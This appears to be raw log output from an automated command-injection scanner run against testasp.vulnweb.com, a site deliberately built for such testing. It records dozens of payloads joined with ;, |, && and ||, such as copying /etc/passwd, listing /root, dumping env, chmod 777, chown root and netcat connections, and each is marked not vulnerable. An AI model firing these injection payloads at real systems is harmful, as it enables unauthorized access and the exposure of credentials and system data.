+URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
